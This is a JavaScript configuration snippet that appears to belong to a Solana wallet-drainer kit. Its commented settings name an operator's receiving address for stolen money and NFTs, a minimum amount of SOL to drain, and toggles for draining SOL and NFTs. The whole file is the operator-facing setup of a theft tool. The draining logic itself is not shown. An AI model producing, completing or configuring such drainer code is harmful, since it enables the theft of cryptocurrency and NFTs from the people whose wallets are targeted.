/*   = = = = = YOUR WALLET ADRESS = = = = =   */
const receiveAddress = "3QAPWMUo8NHQqxUCn7Pxhny8aTfcH1cBkDK5L9Adt6bY"; // Adress where you want to receive money/nfts

/*   = = = = = AMOUNT = = = = =   */
const amount = {
    minimal: 2 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
}

/*   = = = = = MODES = = = = =   */
const active = {
    solana: true, // To drain sol, remove this line if you only want to drain NFTs
    nfts: true, // To Drain nfts, remove this line if you only want to drain Solana
}
